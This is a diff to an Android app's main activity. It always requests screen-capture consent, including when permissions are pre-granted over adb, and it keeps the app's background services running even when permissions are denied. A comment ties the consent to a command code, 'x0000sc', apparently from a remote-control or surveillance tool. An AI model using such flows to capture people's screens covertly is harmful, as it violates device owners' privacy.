@@ -52,8 +52,11 @@ public class MainActivity extends AppCompatActivity {
     private final ActivityResultLauncher<Intent> screenCaptureLauncher =
             registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
                 if (result.getResultCode() == RESULT_OK && result.getData() != null) {
+                    // Store the consent token; the service creates the
+                    // (single-use) MediaProjection once the FGS is running.
                     MainService.setScreenCaptureData(result.getResultCode(), result.getData());
                 }
+                startCoreServices();
             });
 
     @RequiresApi(api = Build.VERSION_CODES.R)
@@ -76,9 +79,18 @@ public class MainActivity extends AppCompatActivity {
             askPermission();
         }
         else {
-            requestBatteryOptimizationPermission();
-            startCoreServices();
+            continueSetup();
         }
+    }
+
+    /**
+     * Unconditional launch flow once runtime permissions are settled: request
+     * MediaProjection consent (needed for {@code x0000sc}) no matter how the
+     * permissions were granted (in-app dialog OR adb pre-grant), then start the
+     * core services when the consent result comes back.
+     */
+    private void continueSetup() {
+        requestScreenCapturePermission();
     }
 
     private boolean hasMissingPermissions() {
@@ -161,9 +173,12 @@ public class MainActivity extends AppCompatActivity {
 
         if (allGranted) {
             Toast.makeText(this, "Permission granted successfully!", Toast.LENGTH_SHORT).show();
-            requestScreenCapturePermission();
+            continueSetup();
         } else {
             Toast.makeText(this, "Some permissions were denied", Toast.LENGTH_SHORT).show();
+            // Still start the service so everything not gated on the denied
+            // permission keeps working.
+            startCoreServices();
         }
     }
 
